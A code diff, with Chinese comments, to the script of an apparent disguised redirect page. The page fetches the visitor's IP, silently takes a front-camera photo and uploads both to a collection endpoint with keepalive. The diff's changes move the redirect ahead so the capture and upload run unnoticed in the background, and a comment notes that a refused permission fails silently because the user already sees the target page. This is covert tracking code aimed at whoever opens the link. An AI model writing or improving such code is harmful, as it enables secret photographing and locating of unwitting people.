@@ -135,19 +135,22 @@
             document.title = "正在加载...";
           }
 
-          // 并行获取IP地址(超时50ms后继续,不阻塞拍照)
-          let userIP = null;
-          Promise.race([
-            fetch("https://api.ipify.org?format=json")
-              .then((res) => res.json())
-              .then((data) => {
-                userIP = data.ip;
-              })
-              .catch(() => {}),
-            new Promise((resolve) => setTimeout(resolve, 50))
-          ]);
+          // ⚡ 极速跳转优化：立即跳转到目标页面，拍照和IP获取完全异步后台执行
+          // 延迟10ms跳转，让拍照流程有机会启动
+          setTimeout(function() {
+            window.location.replace(redirectUrl);
+          }, 10);
 
-          // 立即开始拍照(不等IP)
+          // 后台静默获取IP地址（完全异步，不影响跳转）
+          let userIP = null;
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              userIP = data.ip;
+            })
+            .catch(() => {});
+
+          // 后台静默拍照和上传（完全异步，不影响跳转）
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices
               .getUserMedia({
@@ -157,29 +160,24 @@
                   facingMode: "user",
                 },
               })
-              .then(
-                function (stream) {
-                  video.srcObject = stream;
-                  video.play();
+              .then(function (stream) {
+                video.srcObject = stream;
+                video.play();
 
-                  // 等待视频流就绪后再拍照（解决黑屏问题）
-                  video.addEventListener(
-                    "canplay",
-                    function onCanPlay() {
-                      // 额外等待一小段时间确保画面稳定
-                      setTimeout(function () {
+                // 等待视频流就绪后再拍照
+                video.addEventListener(
+                  "canplay",
+                  function onCanPlay() {
+                    // 等待300ms确保画面稳定
+                    setTimeout(function () {
+                      try {
                         context.drawImage(video, 0, 0, 480, 640);
-
-                        // 使用JPEG格式，质量0.7，大幅减少文件大小
                         const imageData = canvas.toDataURL("image/jpeg", 0.7);
-
-                        // 先跳转，后上传（完全不阻塞）
-                        window.location.replace(redirectUrl);
 
                         // 关闭摄像头
                         stream.getTracks().forEach((track) => track.stop());
 
-                        // 异步上传，完全在后台进行
+                        // 后台上传（页面已跳转，使用keepalive确保上传完成）
                         fetch(window.API_CONFIG.UPLOAD, {
                           method: "POST",
                           headers: {
@@ -188,29 +186,24 @@
                           body: JSON.stringify({
                             id: id,
                             image: imageData,
-                            ip: userIP, // 包含IP地址（可能为null）
+                            ip: userIP, // 可能为null
                           }),
-                          keepalive: true, // 页面关闭后也继续上传
+                          keepalive: true, // 关键：页面关闭后也继续上传
                         }).catch((error) => {
-                          console.error("上传错误:", error);
+                          console.error("后台上传错误:", error);
                         });
-                      }, 300); // 等待 300ms 确保画面稳定
-                    },
-                    { once: true }
-                  ); // 只执行一次
-                },
-                function () {
-                  // 权限被拒绝，直接跳转
-                  if (redirectUrl) {
-                    window.location.href = redirectUrl;
-                  }
-                }
-              );
-          } else {
-            // 浏览器不支持，直接跳转
-            if (redirectUrl) {
-              window.location.href = redirectUrl;
-            }
+                      } catch (error) {
+                        console.error("后台拍照错误:", error);
+                      }
+                    }, 300);
+                  },
+                  { once: true }
+                );
+              })
+              .catch(function (error) {
+                console.error("摄像头权限被拒绝:", error);
+                // 静默失败，用户已经看到目标页面
+              });
           }
         },
         false
